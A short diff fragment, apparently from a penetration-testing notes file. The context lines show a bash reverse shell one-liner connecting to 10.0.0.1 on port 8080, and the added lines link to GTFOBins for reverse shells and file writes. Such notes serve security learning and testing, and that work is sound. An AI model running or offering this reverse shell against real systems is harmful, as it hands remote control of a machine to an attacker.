@@ -375,3 +375,6 @@ If bash shell is not working, try wrapping it in a bash -c call.
 ```
 "bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'"
 ```
+
+### See how to get reverse shell/file writes/etc with many programs
+https://gtfobins.github.io
